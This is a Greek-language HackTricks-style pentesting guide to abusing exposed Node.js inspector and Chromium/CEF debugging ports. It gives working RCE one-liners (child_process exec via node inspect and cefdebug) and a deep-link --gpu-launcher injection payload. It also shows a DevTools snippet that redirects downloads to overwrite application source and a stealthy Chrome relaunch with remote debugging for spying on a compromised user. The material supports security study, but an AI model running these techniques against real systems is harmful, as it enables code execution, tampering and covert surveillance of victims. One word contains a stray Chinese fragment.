# Κατάχρηση του Node inspector/CEF debug

{{#include ../../banners/hacktricks-training.md}}

Ιστορικά πρακτικά παραδείγματα περιλαμβάνουν το walkthrough του Multimaster και την επίθεση στον debugger του Visual Studio Code μέσω του CVE-2019-1414· χρησιμοποιήστε τα ως context που αφορά συγκεκριμένες εκδόσεις, αντί να υποθέτετε ότι κάθε τρέχων στόχος Electron ή Chromium εκθέτει τα ίδια primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://nodejs.org/learn/getting-started/debugging): Όταν ξεκινά με το switch `--inspect`, μια διεργασία Node.js ακούει για debugging client. **Από προεπιλογή**, ακούει στο host και port **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.<sup>[[4]](#references)</sup>

Οι inspector clients πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση host, το port και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Εφόσον ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος actor που μπορεί να συνδεθεί σε αυτό το port ενδέχεται να είναι σε θέση να εκτελέσει arbitrary code εκ μέρους της διεργασίας Node.js (**πιθανή privilege escalation**).<sup>[[4]](#references)</sup>

Υπάρχουν διάφοροι τρόποι για την εκκίνηση ενός inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν εκκινήσετε μια inspected process, θα εμφανιστεί κάτι σαν αυτό:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) μπορούν να εκθέσουν έναν debugger με `--remote-debugging-port=9222`. Αυτό εκθέτει τον browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) αντί για έναν Node.js inspector, επομένως τα payloads που βασίζονται στο Node.js `process` δεν εφαρμόζονται άμεσα από προεπιλογή.<sup>[[2]](#references)[[5]](#references)</sup>

Όταν εκκινείτε έναν browser με ενεργοποιημένο debugger, θα εμφανιστεί κάτι σαν το εξής:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε έναν web-browser μπορούν να πραγματοποιούν αιτήματα WebSocket και HTTP σύμφωνα με το μοντέλο ασφάλειας του browser. Απαιτείται μια **αρχική σύνδεση HTTP** για την **απόκτηση ενός μοναδικού debugger session id**. Η **same-origin-policy** **εμποδίζει** τους ιστότοπους να πραγματοποιήσουν **αυτή τη σύνδεση HTTP**. Για πρόσθετη ασφάλεια έναντι [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι τα **'Host' headers** της σύνδεσης καθορίζουν είτε μια **IP address** είτε ακριβώς το **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Αυτό το **μέτρο ασφάλειας αποτρέπει την εκμετάλλευση του inspector** για την εκτέλεση κώδικα με **την απλή αποστολή ενός HTTP request** (κάτι που θα μπορούσε να γίνει μέσω εκμετάλλευσης ενός SSRF vuln).<sup>[[4]](#references)</sup>

### Εκκίνηση του inspector σε running processes

Μπορείτε να στείλετε το **signal SIGUSR1** σε μια running nodejs process, ώστε να την κάνετε να **ξεκινήσει τον inspector** στην προεπιλεγμένη port. Ωστόσο, σημειώστε ότι πρέπει να έχετε επαρκή privileges, επομένως αυτό μπορεί να σας παραχωρήσει **privileged access σε πληροφορίες μέσα στη process**, αλλά όχι άμεσο privilege escalation.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή ο **τερματισμός της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.<sup>[[6]](#references)</sup>

### Σύνδεση με inspector/debugger

Για σύνδεση σε έναν **Chromium-based browser**, μπορείτε να访问σετε τα URLs `chrome://inspect` ή `edge://inspect` για Chrome ή Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, θα πρέπει να διασφαλιστεί ότι ο **target host και η θύρα** εμφανίζονται σωστά. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Μετά την προσθήκη ενός URL για πρόσβαση στον debugger θα εμφανιστεί, π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση με inspector/debugger: Για σύνδεση σε έναν Chromium-based browser,...](<../../images/image (674).png>)

Χρησιμοποιώντας τη **command line**, μπορείτε να συνδεθείτε σε έναν debugger/inspector με:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει την **εύρεση inspectors** που εκτελούνται τοπικά και την **έγχυση κώδικα** σε αυτούς.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Σημειώστε ότι τα **NodeJS RCE exploits δεν θα λειτουργήσουν** αν συνδεθείτε σε έναν browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (χρειάζεται να ελέγξετε το API για να βρείτε ενδιαφέροντα πράγματα που μπορείτε να κάνετε με αυτό).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE στον NodeJS Debugger/Inspector

> [!TIP]
> Αν ήρθατε εδώ αναζητώντας πώς να αποκτήσετε [**RCE από ένα XSS στο Electron, ελέγξτε αυτή τη σελίδα.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι για να αποκτήσετε **RCE** όταν μπορείτε να **συνδεθείτε** σε έναν Node **inspector** είναι να χρησιμοποιήσετε κάτι σαν το παρακάτω (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Payloads του Chrome DevTools Protocol

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω διαπιστώσει ότι έχουν χρησιμοποιηθεί για την εκμετάλλευση αυτού του protocol.

### Injection παραμέτρων μέσω Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino Security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF καταχώρισε ένα custom UR**I** στο σύστημα (workspaces://index.html), το οποίο λάμβανε ολόκληρο το URI και στη συνέχεια **εκκινούσε την εφαρμογή βασισμένη στο CEF**n** με μια διαμόρφωση που κατασκευαζόταν εν μέρει από αυτό το URI.<sup>[[8]](#references)</sup>

Ανακαλύφθηκε ότι οι παράμετροι του URI γίνονταν URL decoded και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να κάνει **inject** το flag **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετες ενέργειες.<sup>[[8]](#references)</sup>

Έτσι, ένα payload όπως το εξής:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει ένα calc.exe.<sup>[[8]](#references)</sup>

### Αντικατάσταση αρχείων

Αλλάξτε τον φάκελο όπου **θα αποθηκεύονται τα αρχεία που έχουν ληφθεί** και κατεβάστε ένα αρχείο για να **αντικαταστήσετε** τον **source code** της εφαρμογής που χρησιμοποιείται συχνά με τον **κακόβουλο κώδικά** σας.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE και exfiltration

Η STAR Labs έδειξε ότι οι εκτεθειμένες υπηρεσίες WebDriver/CDP μπορούν να επιτρέψουν αυθαίρετες αναγνώσεις αρχείων και RCE· το DNS rebinding μπορεί να ολοκληρώσει την exploit chain σε ορισμένες διαμορφώσεις.<sup>[[9]](#references)</sup>

Για πρόσθετες ιστορικές περιπτώσεις browser-automation και ασφάλειας του Chromium, δείτε το write-up του Counter WebDriver και τα issues 773, 1742 και 1944 του Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά το compromising** ενός user PC που χρησιμοποιεί browser βασισμένο σε Chrome/Chromium, θα μπορούσατε να εκκινήσετε μια διεργασία Chrome με το **debugging ενεργοποιημένο και να κάνετε port-forward τη θύρα debugging**, ώστε να έχετε πρόσβαση σε αυτή. Με αυτόν τον τρόπο θα μπορείτε να **επιθεωρείτε όλα όσα κάνει το victim με το Chrome και να κλέβετε ευαίσθητες πληροφορίες**.<sup>[[7]](#references)</sup>

Ο stealth τρόπος είναι να **τερματίσετε κάθε διεργασία Chrome** και έπειτα να καλέσετε κάτι όπως:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Εργαλείο inspection και exploitation του CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution στο Visual Studio Code μέσω του Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Οδηγός debugging του Node.js - Ξεκινώντας](https://nodejs.org/learn/getting-started/debugging)
- [5] [Πρωτόκολλο Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup του corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Κατάχρηση του debugging feature του Chrome για απομακρυσμένη παρατήρηση και έλεγχο browsing sessions](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution στο AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Μιλάς σε μένα; - WebDriver RCE μέσω DNS Rebinding και CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Αντιμετώπιση του WebDriver - Από Bot σε RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
